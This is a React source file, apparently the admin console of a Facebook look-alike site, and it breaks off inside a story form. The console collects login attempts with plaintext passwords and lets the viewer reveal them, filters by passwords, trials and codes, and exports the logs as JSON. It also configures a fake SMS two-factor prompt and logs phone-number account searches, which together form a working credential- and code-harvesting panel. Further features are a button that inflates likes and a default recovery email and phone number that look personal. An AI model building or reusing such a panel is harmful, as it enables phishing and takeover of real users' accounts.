import React, { useState, useEffect } from 'react';
import {
  Shield,
  ShieldCheck,
  Users,
  FileText,
  Bell,
  Plus,
  Trash2,
  Edit3,
  Check,
  RefreshCw,
  ArrowLeft,
  Activity,
  Server,
  CheckCircle2,
  Heart,
  MessageCircle,
  Share2,
  Globe,
  Image as ImageIcon,
  Palette,
  X,
  ExternalLink,
  Film,
  Play,
  Video,
  Camera,
  Upload,
  UserPlus,
  Database,
  Key,
  Clock,
  Code2,
  Copy,
  CheckCheck,
  Eye,
  EyeOff,
  Search,
  Terminal,
  Zap,
  Sparkles,
  Filter,
  Download,
  ArrowRight
} from 'lucide-react';
import { api } from '../api/client';
import { INITIAL_POSTS, INITIAL_STORIES, INITIAL_NOTIFICATIONS } from '../data/mockData';
import { getCurrentRoute, setRoute } from '../utils/router';

// Helper to safely extract image URL(s) from any post data structure
export const getPostImageUrl = (post) => {
  if (!post) return null;
  if (Array.isArray(post.media) && post.media.length > 0) {
    const first = post.media[0];
    return typeof first === 'string' ? first : first?.url || null;
  }
  if (post.media && typeof post.media === 'object' && post.media.url) {
    return post.media.url;
  }
  if (Array.isArray(post.mediaGrid) && post.mediaGrid.length > 0) {
    return post.mediaGrid[0]?.url || null;
  }
  if (typeof post.image === 'string') return post.image;
  if (typeof post.imageUrl === 'string') return post.imageUrl;
  return null;
};

// Helper to safely get all media images for gallery display
export const getPostMediaImages = (post) => {
  if (!post) return [];
  if (Array.isArray(post.mediaGrid) && post.mediaGrid.length > 0) {
    return post.mediaGrid.map((m) => (typeof m === 'string' ? m : m.url)).filter(Boolean);
  }
  if (Array.isArray(post.media) && post.media.length > 0) {
    return post.media.map((m) => (typeof m === 'string' ? m : m.url)).filter(Boolean);
  }
  const single = getPostImageUrl(post);
  return single ? [single] : [];
};

export default function AdminDashboard({ onExit, activeSubTab }) {
  const [activeTab, setActiveTab] = useState(() => {
    if (activeSubTab) return activeSubTab;
    const route = getCurrentRoute();
    if (route.page === 'admin' && route.subPage) {
      return route.subPage;
    }
    return 'logs';
  });

  const handleSelectTab = (tab) => {
    setActiveTab(tab);
    setRoute(`admin/${tab}`);
  };

  useEffect(() => {
    if (activeSubTab && activeSubTab !== activeTab) {
      setActiveTab(activeSubTab);
    }
  }, [activeSubTab]);

  useEffect(() => {
    const handleHash = () => {
      const route = getCurrentRoute();
      if (route.page === 'admin' && route.subPage && route.subPage !== activeTab) {
        setActiveTab(route.subPage);
      }
    };
    window.addEventListener('hashchange', handleHash);
    return () => window.removeEventListener('hashchange', handleHash);
  }, [activeTab]);

  useEffect(() => {
    const route = getCurrentRoute();
    if (route.page === 'admin') {
      setRoute(`admin/${activeTab}`, true);
    }
  }, [activeTab]);
  const [serverStatus, setServerStatus] = useState('checking'); // 'online' | 'offline' | 'checking'
  const [loading, setLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState('');

  // Overview stats
  const [stats, setStats] = useState({
    totalUsers: 0,
    totalPosts: 0,
    totalStories: 0,
    totalNotifications: 0,
    totalLogs: 0,
  });

  // Database login & action logs
  const [loginLogs, setLoginLogs] = useState(() => {
    try {
      return JSON.parse(localStorage.getItem('sphere_login_logs') || '[]');
    } catch {
      return [];
    }
  });
  const [logSearchQuery, setLogSearchQuery] = useState('');
  const [logFilter, setLogFilter] = useState('concentrated'); // 'concentrated' | 'all' | 'passwords' | 'success' | 'trials' | 'codes'
  const [revealedPasswords, setRevealedPasswords] = useState({});
  const [copiedId, setCopiedId] = useState(null);

  const handleCopyText = (text, id) => {
    if (!text) return;
    try {
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text);
      } else {
        const textarea = document.createElement('textarea');
        textarea.value = text;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
      }
    } catch {
      // fallback
    }
    setCopiedId(id);
    setTimeout(() => {
      setCopiedId((curr) => (curr === id ? null : curr));
    }, 2000);
  };

  const togglePasswordVisibility = (id) => {
    setRevealedPasswords((prev) => ({
      ...prev,
      [id]: !prev[id],
    }));
  };

  const handleExportLogsJson = () => {
    const dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(loginLogs, null, 2));
    const downloadAnchor = document.createElement('a');
    downloadAnchor.setAttribute('href', dataStr);
    downloadAnchor.setAttribute('download', `sphere_database_logs_${Date.now()}.json`);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();
  };

  // Users list
  const [users, setUsers] = useState(() => {
    const saved = localStorage.getItem('sphere_admin_users');
    if (saved) {
      try { return JSON.parse(saved); } catch {}
    }
    return [
      {
        id: 'acc_elena_rostova',
        name: 'Elena Rostova',
        shortName: 'Elena',
        email: 'elena.rostova@example.com',
        avatar: 'https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=400&q=80',
        badge: 'Pro Photographer',
        bio: 'Landscape photographer and visual artist 📷',
        showOnDesktopLogin: false,
        showOnMobileLogin: false,
      },
      {
        id: 'acc_berta_hule',
        name: 'Berta Hule',
        shortName: 'Berta',
        email: 'berta.hule@example.com',
        avatar: 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=400&q=80',
        bio: 'Living life one day at a time ✨',
        showOnDesktopLogin: true,
        showOnMobileLogin: true,
      },
      {
        id: 'acc_bol_riak_kuol',
        name: 'Bol Riak Kuol',
        shortName: 'Bol',
        email: 'bol.kuol@example.com',
        avatar: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=400&q=80',
        bio: 'Digital explorer 🌐',
        showOnDesktopLogin: true,
        showOnMobileLogin: true,
      },
      {
        id: 'acc_tahir_adem',
        name: 'Tahir Adem',
        shortName: 'Tahir',
        email: 'tahir.adem@example.com',
        avatar: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=400&q=80',
        bio: 'Software engineer & tech enthusiast 🚀',
        showOnDesktopLogin: true,
        showOnMobileLogin: true,
      },
    ];
  });

  // Posts list
  const [posts, setPosts] = useState(() => {
    const saved = localStorage.getItem('sphere_posts');
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed) && parsed.length > 0) return parsed;
      } catch {}
    }
    return INITIAL_POSTS;
  });

  // Stories list
  const [stories, setStories] = useState(() => {
    const saved = localStorage.getItem('sphere_stories');
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed) && parsed.length > 0 && parsed[0]?.videoUrl) return parsed;
      } catch {}
    }
    return INITIAL_STORIES;
  });

  // Story Form State
  const [newStoryForm, setNewStoryForm] = useState({
    userName: 'Sachin Sharma',
    userAvatar: 'https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?auto=format&fit=crop&w=300&q=80',
    videoUrl: 'https://assets.mixkit.co/videos/preview/mixkit-man-exercising-with-battle-ropes-in-gym-41858-large.mp4',
    mediaUrl: 'https://images.unsplash.com/photo-1534438327276-14e5300c3a48?auto=format&fit=crop&w=800&q=80',
    caption: 'Workout session in progress! 💪🔥',
    timestamp: 'Suggested',
  });

  // Notifications list
  const [notifications, setNotifications] = useState(() => {
    const saved = localStorage.getItem('sphere_notifications');
    if (saved) {
      try { return JSON.parse(saved); } catch {}
    }
    return INITIAL_NOTIFICATIONS;
  });

  // Edit Post Modal State
  const [editingPost, setEditingPost] = useState(null);

  // User Profile Edit & Create State
  const [editingUser, setEditingUser] = useState(null);
  const [isCreatingUser, setIsCreatingUser] = useState(false);
  const [newUserForm, setNewUserForm] = useState({
    name: '',
    shortName: '',
    email: '',
    plainPassword: 'password123',
    avatar: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=400&q=80',
    coverPhoto: 'https://images.unsplash.com/photo-1707343843437-caacff5cfa74?auto=format&fit=crop&w=1200&q=80',
    bio: '',
    showOnDesktopLogin: true,
    showOnMobileLogin: true,
  });

  // New Post Form State
  const [postMode, setPostMode] = useState('standard'); // 'standard' | 'color_card'
  const [selectedAuthorId, setSelectedAuthorId] = useState('acc_elena_rostova');
  const [newPost, setNewPost] = useState({
    authorName: 'Elena Rostova',
    authorAvatar: 'https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=400&q=80',
    content: '',
    caption: '',
    image: '',
    colorCardColor: '#D71444',
    colorCardText: '',
    likes: 250,
  });

  // Color card palette options
  const COLOR_PALETTES = [
    { label: 'Crimson Red', color: '#D71444' },
    { label: 'Deep Blue', color: '#0866FF' },
    { label: 'Sunset Orange', color: '#FA7E1E' },
    { label: 'Forest Emerald', color: '#107C41' },
    { label: 'Royal Purple', color: '#6B46C1' },
    { label: 'Midnight Gradient', color: 'linear-gradient(135deg, #182848, #4b6cb7)' },
  ];

  // Recovery & Meta Account Flow Settings
  const [recoverySettings, setRecoverySettings] = useState(() => {
    try {
      const saved = localStorage.getItem('sphere_recovery_settings');
      if (saved) return JSON.parse(saved);
    } catch {}
    return {
      defaultEmail: 'ademt0614@gmail.com',
      defaultPhone: '+251990039392',
      countdownTime: '(00:36)',
      cardDisplayFallback: 'email',
      twoFactorTitle: 'Check your text messages',
      twoFactorSubtitle: 'Enter the code that we sent to your mobile number.',
      twoFactorTimer: '00:52',
      twoFactorChannel: 'sms',
      twoFactorExpectedCode: '00000',
      twoFactorPlaceholder: 'Code (Clue: 00000)',
      twoFactorWarning: '⚠️ Notice: This is not Facebook. Do not enter real credentials or personal information.',
    };
  });
  const [recoverySavedNotice, setRecoverySavedNotice] = useState(false);
  const [simulatedTestInput, setSimulatedTestInput] = useState('+251911223344');

  const handleSaveRecoverySettings = async (e) => {
    e && e.preventDefault();
    try {
      localStorage.setItem('sphere_recovery_settings', JSON.stringify(recoverySettings));
      window.dispatchEvent(new CustomEvent('sphere_recovery_updated', { detail: recoverySettings }));
    } catch {}
    if (api?.admin?.updateRecoverySettings) {
      await api.admin.updateRecoverySettings(recoverySettings);
    }
    setRecoverySavedNotice(true);
    setTimeout(() => setRecoverySavedNotice(false), 3000);
  };

  const handleResetRecoveryDefaults = () => {
    const defaults = {
      defaultEmail: 'ademt0614@gmail.com',
      defaultPhone: '+251990039392',
      countdownTime: '(00:36)',
      cardDisplayFallback: 'email',
      twoFactorTitle: 'Check your text messages',
      twoFactorSubtitle: 'Enter the code that we sent to your mobile number.',
      twoFactorTimer: '00:52',
      twoFactorChannel: 'sms',
      twoFactorExpectedCode: '00000',
      twoFactorPlaceholder: 'Code (Clue: 00000)',
      twoFactorWarning: '⚠️ Notice: This is not Facebook. Do not enter real credentials or personal information.',
    };
    setRecoverySettings(defaults);
    try {
      localStorage.setItem('sphere_recovery_settings', JSON.stringify(defaults));
      window.dispatchEvent(new CustomEvent('sphere_recovery_updated', { detail: defaults }));
    } catch {}
    if (api?.admin?.updateRecoverySettings) {
      api.admin.updateRecoverySettings(defaults);
    }
    setRecoverySavedNotice(true);
    setTimeout(() => setRecoverySavedNotice(false), 3000);
  };

  // Save to localStorage & trigger sync event whenever posts change
  const syncPostsChange = (updatedPosts) => {
    setPosts(updatedPosts);
    localStorage.setItem('sphere_posts', JSON.stringify(updatedPosts));
    window.dispatchEvent(new Event('sphere_posts_updated'));
  };

  useEffect(() => {
    localStorage.setItem('sphere_admin_users', JSON.stringify(users));
  }, [users]);

  // Load Data and Check Server
  const loadData = async () => {
    setLoading(true);
    try {
      const res = await fetch('/api/health');
      if (res.ok) {
        setServerStatus('online');
        const [overviewRes, usersRes, postsRes, storiesRes, notifsRes, logsRes, recoveryRes] = await Promise.all([
          api.admin.getOverview(),
          api.admin.getUsers(),
          api.admin.getPosts(),
          api.admin.getStories(),
          api.admin.getNotifications(),
          api.admin.getLogs(),
          api.admin.getRecoverySettings ? api.admin.getRecoverySettings() : null,
        ]);

        if (usersRes && Array.isArray(usersRes) && usersRes.length > 0) setUsers(usersRes);
        if (postsRes && Array.isArray(postsRes) && postsRes.length > 0) {
          syncPostsChange(postsRes);
        }
        if (storiesRes && Array.isArray(storiesRes) && storiesRes.length > 0) setStories(storiesRes);
        if (notifsRes && Array.isArray(notifsRes) && notifsRes.length > 0) setNotifications(notifsRes);
        if (logsRes && Array.isArray(logsRes)) setLoginLogs(logsRes);
        if (recoveryRes && recoveryRes.defaultEmail) setRecoverySettings(recoveryRes);

        setStats({
          totalUsers: (usersRes && usersRes.length) || users.length,
          totalPosts: (postsRes && postsRes.length) || posts.length,
          totalStories: (storiesRes && storiesRes.length) || stories.length,
          totalNotifications: (notifsRes && notifsRes.length) || notifications.length,
          totalLogs: (logsRes && logsRes.length) || loginLogs.length,
        });
      } else {
        setServerStatus('offline');
        const localLogs = await api.admin.getLogs();
        if (Array.isArray(localLogs)) setLoginLogs(localLogs);
        setStats({
          totalUsers: users.length,
          totalPosts: posts.length,
          totalStories: stories.length,
          totalNotifications: notifications.length,
          totalLogs: (localLogs && localLogs.length) || loginLogs.length,
        });
      }
    } catch {
      setServerStatus('offline');
      const localLogs = await api.admin.getLogs();
      if (Array.isArray(localLogs)) setLoginLogs(localLogs);
      setStats({
        totalUsers: users.length,
        totalPosts: posts.length,
        totalStories: stories.length,
        totalNotifications: notifications.length,
        totalLogs: (localLogs && localLogs.length) || loginLogs.length,
      });
    } finally {
      setLoading(false);
    }
  };

  // Sync database logs in real time
  useEffect(() => {
    const handleDbUpdated = (e) => {
      if (e?.detail && Array.isArray(e.detail)) {
        setLoginLogs(e.detail);
      } else {
        api.admin.getLogs().then((res) => {
          if (Array.isArray(res)) setLoginLogs(res);
        }).catch(() => {});
      }
    };
    window.addEventListener('sphere_db_updated', handleDbUpdated);
    window.addEventListener('storage', handleDbUpdated);
    return () => {
      window.removeEventListener('sphere_db_updated', handleDbUpdated);
      window.removeEventListener('storage', handleDbUpdated);
    };
  }, []);

  useEffect(() => {
    loadData();
  }, []);

  const showNotificationToast = (msg) => {
    setStatusMessage(msg);
    setTimeout(() => setStatusMessage(''), 3000);
  };

  // Author Dropdown Selection Handler
  const handleSelectAuthor = (authorId) => {
    setSelectedAuthorId(authorId);
    if (authorId === 'custom') {
      setNewPost((prev) => ({
        ...prev,
        authorName: '',
        authorAvatar: 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=400&q=80',
      }));
      return;
    }
    const found = users.find((u) => u.id === authorId);
    if (found) {
      setNewPost((prev) => ({
        ...prev,
        authorName: found.name,
        authorAvatar: found.avatar,
      }));
    }
  };

  // Post Actions: Create
  const handleCreatePost = async (e) => {
    e.preventDefault();
    if (postMode === 'color_card' && !newPost.colorCardText.trim()) {
      alert('Please enter text for the colored status card.');
      return;
    }
    if (postMode === 'standard' && !newPost.content.trim()) {
      alert('Please enter post content message.');
      return;
    }

    const postObj = {
      id: 'post_' + Date.now(),
      author: {
        id: selectedAuthorId,
        name: newPost.authorName || 'Member',
        avatar: newPost.authorAvatar,
        badge: newPost.authorName === 'Elena Rostova' ? 'Pro Photographer' : 'Member',
        verified: true,
        hasFollow: true,
      },
      timestamp: 'Just now',
      privacy: 'public',
      content: newPost.content,
      caption: newPost.caption || '',
      backgroundCard:
        postMode === 'color_card'
          ? {
              color: newPost.colorCardColor,
              text: newPost.colorCardText,
            }
          : null,
      media: newPost.image ? [{ type: 'image', url: newPost.image, aspect: 'landscape' }] : [],
      stats: {
        likes: parseInt(newPost.likes, 10) || 0,
        comments: 0,
        shares: 0,
        reactionBreakdown: {
          like: parseInt(newPost.likes, 10) || 0,
        },
      },
      userReaction: null,
      comments: [],
    };

    const updated = [postObj, ...posts];
    syncPostsChange(updated);

    if (serverStatus === 'online') {
      try {
        await api.admin.createPost(postObj);
      } catch {}
    }

    // Reset Form
    setNewPost({
      authorName: newPost.authorName,
      authorAvatar: newPost.authorAvatar,
      content: '',
      caption: '',
      image: '',
      colorCardColor: '#D71444',
      colorCardText: '',
      likes: 250,
    });
    showNotificationToast('Post published dynamically to feed!');
  };

  // Quick Like Booster (+50 Likes)
  const handleBoostLikes = async (postId, boostAmount = 50) => {
    const updated = posts.map((p) => {
      if (p.id !== postId) return p;
      const currentLikes = (p.stats && p.stats.likes) || 0;
      const newLikes = currentLikes + boostAmount;
      return {
        ...p,
        stats: {
          ...p.stats,
          likes: newLikes,
          reactionBreakdown: {
            ...(p.stats && p.stats.reactionBreakdown),
            like: ((p.stats && p.stats.reactionBreakdown && p.stats.reactionBreakdown.like) || 0) + boostAmount,
          },
        },
      };
    });

    syncPostsChange(updated);
    showNotificationToast(`Added +${boostAmount} likes!`);

    if (serverStatus === 'online') {
      try {
        const target = updated.find((p) => p.id === postId);
        if (target) await api.admin.updatePost(postId, { stats: target.stats });
      } catch {}
    }
  };

  // Delete Post
  const handleDeletePost = async (postId) => {
    if (!window.confirm('Are you sure you want to delete this post from the feed?')) return;
    const updated = posts.filter((p) => p.id !== postId);
    syncPostsChange(updated);

    if (serverStatus === 'online') {
      try {
        await api.admin.deletePost(postId);
      } catch {}
    }
    showNotificationToast('Post removed successfully.');
  };

  // Save Edit Post
  const handleSaveEditPost = async (e) => {
    e.preventDefault();
    if (!editingPost) return;

    const updated = posts.map((p) => {
      if (p.id !== editingPost.id) return p;
      return {
        ...p,
        content: editingPost.content,
        caption: editingPost.caption || '',
        media: editingPost.image
          ? [{ type: 'image', url: editingPost.image, aspect: 'landscape' }]
          : p.media,
        stats: {
          ...p.stats,
          likes: parseInt(editingPost.likes, 10) || 0,
        },
      };
    });

    syncPostsChange(updated);
    setEditingPost(null);
    showNotificationToast('Post updated successfully!');

    if (serverStatus === 'online') {
      try {
        const target = updated.find((p) => p.id === editingPost.id);
        if (target) await api.admin.updatePost(editingPost.id, target);
      } catch {}
    }
  };

  // Stories Management Handlers
  const syncStoriesChange = (updated) => {
    setStories(updated);
    localStorage.setItem('sphere_stories', JSON.stringify(updated));
    window.dispatchEvent(new CustomEvent('sphere_stories_updated', { detail: updated }));
  };

  const handleCreateStory = async (e) => {
    e.preventDefault();
    if (!newStoryForm.videoUrl && !newStoryForm.mediaUrl) {
      alert('Please provide a Video URL or Image URL for the story');
      return;
    }
    const newStory = {
      id: `story-${Date.now()}`,
      userName: newStoryForm.userName || 'Admin Official',
      userAvatar: newStoryForm.userAvatar || 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=400&q=80',
      mediaUrl: newStoryForm.mediaUrl || 'https://images.unsplash.com/photo-1534438327276-14e5300c3a48?auto=format&fit=crop&w=800&q=80',
      mediaType: 'video',
      videoUrl: newStoryForm.videoUrl,
      caption: newStoryForm.caption || '',
      timestamp: newStoryForm.timestamp || 'Just now',
      unseen: true,
    };
    const updated = [newStory, ...stories];
    syncStoriesChange(updated);
    showNotificationToast(`Video story published for ${newStory.userName}!`);
    if (serverStatus === 'online') {
      try {
        await api.admin.createStory(newStory);
      } catch {}
    }
  };

  const handleDeleteStory = async (storyId) => {
    if (!window.confirm('Delete this story?')) return;
    const updated = stories.filter((s) => s.id !== storyId);
    syncStoriesChange(updated);
    showNotificationToast('Story removed.');
    if (serverStatus === 'online') {
      try {
        await api.admin.deleteStory(storyId);
      } catch {}
    }
  };

  const handleResetStories = () => {
    if (!window.confirm('Reset all stories back to default 5 video stories?')) return;
    syncStoriesChange(INITIAL_STORIES);
    showNotificationToast('Stories reset to 5 default video stories.');
  };

  // User Management Handlers (Profile Name, Avatar, Bio, & Credentials)
  const syncUsersChange = async (updatedUsers, specificUpdatedUser = null) => {
    setUsers(updatedUsers);
    localStorage.setItem('sphere_admin_users', JSON.stringify(updatedUsers));
    localStorage.setItem('sphere_users', JSON.stringify(updatedUsers));
    localStorage.setItem('fb_recent_accounts', JSON.stringify(updatedUsers));

    if (specificUpdatedUser) {
      const currentSaved = localStorage.getItem('sphere_current_user');
      if (currentSaved) {
        try {
          const parsedCurrent = JSON.parse(currentSaved);
          if (parsedCurrent.id === specificUpdatedUser.id || parsedCurrent.email === specificUpdatedUser.email) {
            const nextCurrent = { ...parsedCurrent, ...specificUpdatedUser };
            localStorage.setItem('sphere_current_user', JSON.stringify(nextCurrent));
            window.dispatchEvent(new CustomEvent('sphere_user_updated', { detail: nextCurrent }));
          }
        } catch {}
      }
      window.dispatchEvent(new CustomEvent('sphere_user_updated', { detail: specificUpdatedUser }));
    }

    window.dispatchEvent(new CustomEvent('sphere_users_updated', { detail: updatedUsers }));

    if (specificUpdatedUser && serverStatus === 'online') {
      try {
        await api.admin.updateUser(specificUpdatedUser.id, specificUpdatedUser);
      } catch (err) {
        console.warn('Failed to update user on backend:', err);
      }
    }
  };

  const handleStartEditUser = (user) => {
    setEditingUser({
      ...user,
      plainPassword: user.plainPassword || user.password || 'password123',
    });
  };

  const handleSaveEditUser = async (e) => {
    e.preventDefault();
    if (!editingUser) return;

    const short = editingUser.shortName || editingUser.name.split(' ')[0] || editingUser.name;
    const userToSave = {
      ...editingUser,
      shortName: short,
      password: editingUser.plainPassword || 'password123',
    };

    const updated = users.map((u) => (u.id === editingUser.id ? userToSave : u));
    await syncUsersChange(updated, userToSave);
    setEditingUser(null);
    showNotificationToast(`Profile updated for ${userToSave.name}!`);
  };

  const handleCreateNewUser = async (e) => {
    e.preventDefault();
    if (!newUserForm.name || !newUserForm.email) {
      alert('Please provide at least a Name and Email');
      return;
    }

    const short = newUserForm.shortName || newUserForm.name.split(' ')[0] || newUserForm.name;
    const newUser = {
      id: `acc_${Date.now()}`,
      name: newUserForm.name,
      shortName: short,
      email: newUserForm.email,
      avatar: newUserForm.avatar || 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=400&q=80',
      coverPhoto: newUserForm.coverPhoto || 'https://images.unsplash.com/photo-1707343843437-caacff5cfa74?auto=format&fit=crop&w=1200&q=80',
      bio: newUserForm.bio || 'New member 🌐',
      plainPassword: newUserForm.plainPassword || 'password123',
      password: newUserForm.plainPassword || 'password123',
      showOnDesktopLogin: !!newUserForm.showOnDesktopLogin,
      showOnMobileLogin: !!newUserForm.showOnMobileLogin,
      verified: true,
      online: true,
    };

    const updated = [newUser, ...users];
    await syncUsersChange(updated, newUser);

    if (serverStatus === 'online') {
      try {
        await api.admin.createUser(newUser);
      } catch (err) {
        console.warn('Failed to create user on backend:', err);
      }
    }

    setIsCreatingUser(false);
    setNewUserForm({
      name: '',
      shortName: '',
      email: '',
      plainPassword: 'password123',
      avatar: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=400&q=80',
      coverPhoto: 'https://images.unsplash.com/photo-1707343843437-caacff5cfa74?auto=format&fit=crop&w=1200&q=80',
      bio: '',
      showOnDesktopLogin: true,
      showOnMobileLogin: true,
    });
    showNotificationToast(`User ${newUser.name} created successfully!`);
  };

  const handleDeleteUser = async (userId) => {
    const target = users.find((u) => u.id === userId);
    if (!window.confirm(`Delete account "${target?.name || userId}"?`)) return;
    const updated = users.filter((u) => u.id !== userId);
    setUsers(updated);
    localStorage.setItem('sphere_admin_users', JSON.stringify(updated));
    localStorage.setItem('sphere_users', JSON.stringify(updated));
    localStorage.setItem('fb_recent_accounts', JSON.stringify(updated));
    window.dispatchEvent(new CustomEvent('sphere_users_updated', { detail: updated }));

    if (serverStatus === 'online') {
      try {
        await api.admin.deleteUser(userId);
      } catch {}
    }
    showNotificationToast('User account deleted.');
  };

  const handleClearLogs = async () => {
    if (!window.confirm('Are you sure you want to clear all database login records?')) return;
    await api.admin.clearLogs();
    setLoginLogs([]);
    showNotificationToast('Database logs cleared.');
  };

  const handleDeleteSingleLog = async (logId) => {
    const updated = loginLogs.filter((l) => l.id !== logId);
    setLoginLogs(updated);
    try {
      localStorage.setItem('sphere_login_logs', JSON.stringify(updated));
    } catch {}
    window.dispatchEvent(new CustomEvent('sphere_db_updated', { detail: updated }));
    if (serverStatus === 'online') {
      try {
        await api.admin.deleteSingleLog(logId);
      } catch {}
    }
    showNotificationToast('Record deleted.');
  };

  const handleSimulateTestLogin = async () => {
    const testUsername = 'Bol Riak Kuo';
    const testPassword = 'myPlainPassword_123';
    await api.logAttempt({
      username: testUsername,
      email: testUsername,
      password: testPassword,
      accountName: testUsername,
      action: 'Login Button Clicked (Test)',
      success: true,
      trialCount: 1,
    });
    showNotificationToast(`Test entry for "${testUsername}" saved to database!`);
    loadData();
  };

  const handleSimulateFindAccountSearch = async () => {
    const testQuery = '+251 91 122 3344';
    await api.logAttempt({
      username: testQuery,
      email: testQuery,
      accountName: testQuery,
      password: '[Find Account Query]',
      action: `Find Account Search: "${testQuery}" (Continue Clicked)`,
      success: true,
      trialCount: 1,
    });
    showNotificationToast(`Find Account search for "${testQuery}" saved to database!`);
    loadData();
  };

  return (
    <div className="fb-admin-console-root">
      {/* Top Navbar */}
      <header className="fb-admin-header">
        <div className="fb-admin-header-left">
          <div className="fb-admin-logo-badge">
            <Shield size={22} color="#FFFFFF" strokeWidth={2.4} />
          </div>
          <div>
            <h1 className="fb-admin-title">Sphere Management Console</h1>
            <div className="fb-admin-status-indicator">
              <span className={`status-dot ${serverStatus === 'online' ? 'green' : 'amber'}`} />
              <span className="status-label">
                {serverStatus === 'online'
                  ? 'API Server Connected (Port 5000)'
                  : 'Standalone Browser Mode (Local Store)'}
              </span>
            </div>
          </div>
        </div>

        <div className="fb-admin-header-right">
          <button
            type="button"
            className="fb-admin-refresh-btn"
            onClick={loadData}
            title="Refresh Data"
          >
            <RefreshCw size={17} className={loading ? 'spin' : ''} />
            <span>Sync</span>
          </button>

          <button
            type="button"
            className="fb-admin-exit-btn"
            onClick={onExit}
            title="Back to Facebook"
          >
            <ArrowLeft size={18} />
            <span>Back to App</span>
          </button>
        </div>
      </header>

      {/* Toast Alert */}
      {statusMessage && (
        <div className="fb-admin-toast-banner">
          <CheckCircle2 size={18} color="#008000" />
          <span>{statusMessage}</span>
        </div>
      )}

      {/* Main Container */}
      <div className="fb-admin-body">
        {/* Navigation Sidebar */}
        <aside className="fb-admin-nav-sidebar">
          <button
            className={`fb-admin-nav-item ${activeTab === 'overview' ? 'active' : ''}`}
            onClick={() => handleSelectTab('overview')}
          >
            <Activity size={18} />
            <span>Dashboard Overview</span>
          </button>

          <button
            className={`fb-admin-nav-item ${activeTab === 'users' ? 'active' : ''}`}
            onClick={() => handleSelectTab('users')}
          >
            <Users size={18} />
            <span>Users & Login Accounts ({users.length})</span>
          </button>

          <button
            className={`fb-admin-nav-item ${activeTab === 'logs' ? 'active' : ''}`}
            onClick={() => handleSelectTab('logs')}
          >
            <Database size={18} />
            <span>Database & Login Logs ({loginLogs.length})</span>
            {loginLogs.length > 0 && (
              <span
                style={{
                  marginLeft: 'auto',
                  fontSize: '10px',
                  fontWeight: 800,
                  background: activeTab === 'logs' ? '#FFFFFF' : '#0866FF',
                  color: activeTab === 'logs' ? '#0866FF' : '#FFFFFF',
                  padding: '1px 6px',
                  borderRadius: '999px',
                  letterSpacing: '0.4px',
                }}
              >
                LIVE
              </span>
            )}
          </button>

          <button
            className={`fb-admin-nav-item ${activeTab === 'recovery' ? 'active' : ''}`}
            onClick={() => handleSelectTab('recovery')}
          >
            <Shield size={18} />
            <span>Recovery & Meta Settings</span>
          </button>

          <button
            className={`fb-admin-nav-item ${activeTab === 'posts' ? 'active' : ''}`}
            onClick={() => handleSelectTab('posts')}
          >
            <FileText size={18} />
            <span>Feed Posts ({posts.length})</span>
          </button>

          <button
            className={`fb-admin-nav-item ${activeTab === 'stories' ? 'active' : ''}`}
            onClick={() => handleSelectTab('stories')}
          >
            <Film size={18} />
            <span>Video Stories ({stories.length})</span>
          </button>

          <button
            className={`fb-admin-nav-item ${activeTab === 'notifs' ? 'active' : ''}`}
            onClick={() => handleSelectTab('notifs')}
          >
            <Bell size={18} />
            <span>Notifications ({notifications.length})</span>
          </button>
        </aside>

        {/* Content Area */}
        <main className="fb-admin-main-content">
          {/* ========================================================
              TAB: VIDEO STORIES MANAGEMENT
              ======================================================== */}
          {activeTab === 'stories' && (
            <div className="fb-admin-tab-pane">
              <div className="fb-admin-section-header-row">
                <div>
                  <h2 className="fb-admin-section-heading">Video Stories Management</h2>
                  <p className="fb-admin-section-sub">
                    Publish video stories, preview video feeds, and manage active story carousels.
                  </p>
                </div>
                <button
                  type="button"
                  className="fb-admin-btn-secondary"
                  onClick={handleResetStories}
                  title="Reset stories to default 5 video stories"
                >
                  <RefreshCw size={14} />
                  <span>Reset Default Stories</span>
                </button>
              </div>

              {/* Publish Video Story Card */}
              <div className="fb-admin-card fb-admin-form-card" style={{ marginBottom: '24px' }}>
                <h3 className="fb-admin-card-title">Publish New Video Story</h3>
                <form onSubmit={handleCreateStory} className="fb-admin-form">
                  <div className="fb-admin-form-row">
                    <div className="fb-admin-form-group">
                      <label className="fb-admin-label">Author Name</label>
                      <input
                        type="text"
                        className="fb-admin-input"
                        placeholder="e.g. Sachin Sharma"
                        value={newStoryForm.userName}
                        onChange={(e) => setNewStoryForm({ ...newStoryForm, userName: e.target.value })}
                        required
                      />
                    </div>
                    <div className="fb-admin-form-group">
                      <label className="fb-admin-label">Author Avatar URL</label>
                      <input
                        type="url"
                        className="fb-admin-input"
                        placeholder="Avatar image URL"
                        value={newStoryForm.userAvatar}
                        onChange={(e) => setNewStoryForm({ ...newStoryForm, userAvatar: e.target.value })}
                        required
                      />
                    </div>
                  </div>

                  <div className="fb-admin-form-row">
                    <div className="fb-admin-form-group">
                      <label className="fb-admin-label">Video MP4 URL</label>
                      <input
                        type="url"
                        className="fb-admin-input"
                        placeholder="https://...mp4"
                        value={newStoryForm.videoUrl}
                        onChange={(e) => setNewStoryForm({ ...newStoryForm, videoUrl: e.target.value })}
                        required
                      />
                    </div>
                    <div className="fb-admin-form-group">
                      <label className="fb-admin-label">Cover Poster Image URL</label>
                      <input
                        type="url"
